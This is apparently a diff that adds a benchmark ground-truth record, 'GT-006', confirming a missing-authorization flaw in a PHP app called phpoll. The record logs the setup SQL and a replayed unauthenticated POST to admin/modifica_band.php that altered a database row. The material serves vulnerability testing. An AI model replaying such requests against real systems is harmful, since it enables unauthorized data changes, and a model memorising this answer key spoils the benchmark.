@@ -1,0 +1,40 @@
+{
+  "gt_id": "GT-006",
+  "app": "phpoll",
+  "verified_at": "2026-09-06T04:57:38.317767+00:00",
+  "verdict": "vulnerable",
+  "summary": "visitor POST to admin/modifica_band.php returned 200; band row id=69 nome_band changed DRHLGT_band_before_8670657866 -> DRHLGT_band_after_8670657866 (updated=True).",
+  "sql_statements": [
+    {
+      "kind": "query",
+      "sql": "SELECT id, nome_band, voti FROM phpoll_test_band ORDER BY id LIMIT 1"
+    },
+    {
+      "kind": "execute",
+      "sql": "UPDATE phpoll_test_band SET nome_band='DRHLGT_band_before_8670657866' WHERE id=69"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT nome_band FROM phpoll_test_band WHERE id=69"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "table": "phpoll_test_band",
+      "row": "id=69",
+      "column": "nome_band",
+      "token1": "DRHLGT_band_before_8670657866",
+      "token2": "DRHLGT_band_after_8670657866"
+    },
+    {
+      "kind": "replay",
+      "role": "visitor (no login)",
+      "request": "POST admin/modifica_band.php nome_band_0=DRHLGT_band_after_8670657866 id_0=69",
+      "status_code": 200,
+      "db_nome_band_before": "DRHLGT_band_before_8670657866",
+      "db_nome_band_after": "DRHLGT_band_after_8670657866",
+      "updated": true
+    }
+  ]
+}
